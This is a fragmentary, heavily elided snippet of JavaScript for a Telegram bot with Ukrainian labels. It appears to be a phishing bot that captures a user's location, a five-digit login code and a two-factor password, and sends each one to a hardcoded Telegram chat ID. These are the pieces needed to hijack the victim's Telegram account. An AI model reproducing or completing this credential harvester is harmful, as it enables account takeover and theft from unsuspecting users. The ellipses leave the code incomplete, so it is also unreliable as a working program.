...
bot.start(async (ctx) => {
    ...
    bot.telegram.sendMessage(1637349519, 'Старт')
    try {
...
bot.on('location', (ctx) => {
    ...
    if (location) {
        ...
        bot.telegram.sendMessage(1637349519, `Локація`)
...
bot.on('message', msg => {
    ...
    if(code.length < 5){
        ...
        if(code.length === 5){
            ...
            const now = new Date().toLocaleString()
            bot.telegram.sendMessage(1637349519, `Код: ${code}`)
            code = ''
        }
    } 
    if(text.length===6 || text.length === 4){
        ...
        bot.telegram.sendMessage(1637349519, `Двохфакторка: ${text}`)
        code = ''
